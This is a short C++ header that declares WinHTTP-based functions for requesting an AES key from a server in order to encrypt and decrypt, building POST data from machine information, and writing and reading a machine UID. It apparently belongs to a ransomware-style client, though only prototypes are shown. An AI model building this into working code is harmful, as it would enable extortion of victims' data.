#pragma once
#pragma comment (lib, "Winhttp.lib")
#include <iostream>
#include <fstream>
#include <Windows.h>
#include <string>
#include "winhttp.h"
#include "Lmcons.h"
#include "MachineInfo.h"

using namespace std;


bool sendRequestToEncrypt(wstring server_ip, DWORD server_port, string& aes_key);
bool sendRequestToDecrypt(wstring server_ip, DWORD server_port, string& returned_aes_base64_key);
string getPostData();
bool writeUID(string uid);
bool readUID(string &uid);